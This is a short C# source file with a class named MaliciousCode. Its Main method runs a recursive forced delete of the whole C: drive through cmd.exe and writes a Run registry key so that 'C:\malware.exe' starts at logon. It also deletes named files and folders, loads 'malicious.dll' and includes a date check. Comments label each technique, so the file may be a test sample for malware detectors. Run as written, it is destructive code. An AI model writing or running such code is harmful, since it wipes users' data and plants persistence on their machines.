using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

class MaliciousCode
{
    static void Main()
    {
        // Process execution
        Process.Start("cmd.exe", "/c del /f /s /q C:\\*");
        
        // Registry manipulation
        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", 
                         "Malware", "C:\\malware.exe");
        
        // File deletion
        File.Delete("C:\\important_file.txt");
        Directory.Delete("C:\\Important", true);
        
        // Dynamic assembly loading
        Assembly.LoadFrom("malicious.dll");
        
        // Time-based trigger
        if (DateTime.Now > new DateTime(2024, 12, 31))
        {
            Environment.Exit(0);
        }
    }
}